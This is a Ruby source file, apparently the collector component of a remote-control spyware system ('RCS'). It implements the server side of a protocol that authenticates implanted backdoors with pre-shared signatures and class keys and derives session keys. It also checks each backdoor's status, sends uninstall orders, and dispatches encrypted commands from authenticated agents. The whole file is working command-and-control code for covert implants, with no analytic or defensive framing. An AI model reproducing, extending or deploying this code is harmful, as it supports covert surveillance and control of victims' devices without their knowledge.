#
#  The Synchronization REST Protocol
#

# relatives
require_relative 'sessions.rb'
require_relative 'db.rb'
require_relative 'commands.rb'

# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/crypt'
require 'rcs-common/pascalize'

# system
require 'securerandom'
require 'digest/sha1'

module RCS
module Collector

class Protocol
  extend RCS::Tracer
  extend RCS::Crypt
  extend RCS::Collector::Commands

  # Authentication phase
  # ->  Crypt_C ( Kd, NonceDevice, BuildId, InstanceId, SubType, sha1 ( BuildId, InstanceId, SubType, Cb ) )
  # <-  [ Crypt_C ( Ks ), Crypt_K ( NonceDevice, Response ) ]  |  SetCookie ( SessionCookie )
  def self.authenticate(peer, uri, content)
    trace :info, "[#{peer}] Authentication required..."

    # integrity check (104 byte of data, 112 padded)
    return unless content.length == 112

    # decrypt the message with the per customer signature
    begin
      message = aes_decrypt(content, DB.backdoor_signature)
    rescue Exception => e
      trace :error, "[#{peer}] Invalid message decryption: #{e.message}"
      return
    end

    # first part of the session key, chosen by the client
    # it will be used to derive the session key later along with Ks (server chosen)
    # and the Cb (pre-shared conf key)
    kd = message.slice!(0..15)
    trace :debug, "[#{peer}] Auth -- Kd: " << kd.unpack('H*').to_s

    # the client NOnce that has to be returned by the server
    # this is used to authenticate the server
    # returning it crypted with the session key it will confirm the
    # authenticity of the server
    nonce = message.slice!(0..15)
    trace :debug, "[#{peer}] Auth -- Nonce: " << nonce.unpack('H*').to_s

    # the build_id identification
    build_id = message.slice!(0..15)
    build_id_real = build_id.delete("\x00")
    # substitute the first 4 chars with RCS_ because of the client side scrambling
    build_id_real[0..3] = 'RCS_'
    trace :info, "[#{peer}] Auth -- BuildId: " << build_id_real

    # instance of the device
    instance_id = message.slice!(0..19)
    trace :info, "[#{peer}] Auth -- InstanceId: " << instance_id.unpack('H*').first

    # subtype of the device
    subtype = message.slice!(0..15)
    trace :info, "[#{peer}] Auth -- subtype: " << subtype.delete("\x00")

    # identification digest
    sha = message.slice!(0..19)
    trace :debug, "[#{peer}] Auth -- sha: " << sha.unpack('H*').to_s

    # get the class key from the db
    conf_key = DB.class_key_of build_id_real

    # this class does not exist
    return if conf_key.nil?

    # the server will calculate the same sha digest and authenticate the backdoor
    # since the conf key is pre-shared
    sha_check = Digest::SHA1.digest(build_id + instance_id + subtype + conf_key)
    trace :debug, "[#{peer}] Auth -- sha_check: " << sha_check.unpack('H*').to_s

    # identification failed
    unless sha.eql? sha_check then
      trace :warn, "[#{peer}] Invalid identification"
      return
    end

    trace :info, "[#{peer}] Authentication phase 1 completed"

    # remove the trailing zeroes from the strings
    instance_id = instance_id.unpack('H*').first
    subtype.delete!("\x00")

    # random key part chosen by the server
    ks = SecureRandom.random_bytes(16)
    trace :debug, "[#{peer}] Auth -- Ks: " << ks.unpack('H*').to_s

    # calculate the session key ->  K = sha1(Cb || Ks || Kd)
    # we use a schema like PBKDF1
    k = Digest::SHA1.digest(conf_key + ks + kd)
    trace :debug, "[#{peer}] Auth -- K: " << k.unpack('H*').to_s

    # prepare the response:
    # Crypt_C ( Ks ), Crypt_K ( NonceDevice, Response )
    message = aes_encrypt(ks, DB.backdoor_signature)

    # ask the database the status of the backdoor
    status, bid = DB.backdoor_status(build_id_real, instance_id, subtype)

    response = [Commands::PROTO_NO].pack('I')
    # what to do based on the backdoor status
    case status
      when DB::DELETED_BACKDOOR, DB::NO_SUCH_BACKDOOR, DB::CLOSED_BACKDOOR
        response = [Commands::PROTO_UNINSTALL].pack('I')
        trace :info, "[#{peer}] Uninstall command sent"
      when DB::QUEUED_BACKDOOR
        response = [Commands::PROTO_NO].pack('I')
        trace :warn, "[#{peer}] was queued for license limit exceeded"
      when DB::ACTIVE_BACKDOOR, DB::UNKNOWN_BACKDOOR
        # everything is ok or the db is not connected, proceed
        response = [Commands::PROTO_OK].pack('I')

        # create a valid cookie session
        cookie = SessionManager.create(bid, build_id_real, instance_id, subtype, k)

        trace :info, "[#{peer}] Authentication phase 2 completed [#{cookie}]"
    end

    # complete the message for the backdoor
    message += aes_encrypt(nonce + response, k)

    return message, 'application/octet-stream', cookie
  end


  def self.valid_authentication(peer, cookie)

    # check if the cookie was created correctly and if it is still valid
    valid = SessionManager.check(cookie)

    if valid then
      trace :debug, "[#{peer}][#{cookie}] Authenticated"
    else
      trace :warn, "[#{peer}][#{cookie}] Invalid cookie"
    end

    return valid
  end

  
  def self.commands(peer, cookie, content)
    # retrieve the session
    session = SessionManager.get cookie

    # invalid session
    if session.nil?
      trace :warn, "[#{peer}][#{cookie}] Invalid session"
      return
    end

    begin
      # decrypt the message
      message = aes_decrypt_integrity(content, session[:key])
    rescue Exception => e
      trace :error, "[#{peer}][#{cookie}] Invalid message decryption: #{e.message}"
      return
    end

    # get the command (slicing the message)
    command = message.slice!(0..3)

    # retrieve the type of the command
    command = command.unpack('I').first.to_i

    # invoke the right method for parsing
    if not Commands::LOOKUP[command].nil? then
      response = self.send Commands::LOOKUP[command], peer, session, message
    else
      trace :warn, "[#{peer}][#{cookie}] unknown command [#{command}]"
      return
    end
    
    begin
      # crypt the message with the session key
      response = aes_encrypt_integrity(response, session[:key])
    rescue
      trace :error, "[#{peer}][#{cookie}] Invalid message encryption"
      return
    end

    return response, 'application/octet-stream'
  end

  # the protocol is parsed here
  # there are only two phases:
  #   - Authentication
  #   - Commands
  def self.parse(peer, uri, cookie, content)

    # if the request does not contains any cookies,
    # we need to perform authentication first
    return authenticate(peer, uri, content) if cookie.nil?

    # we have a cookie, check if it's valid
    return unless valid_authentication(peer, cookie)

    # the agent has been authenticated, parse the commands it sends
    return commands(peer, cookie, content)
  end


end #Protocol

end #Collector::
end #RCS::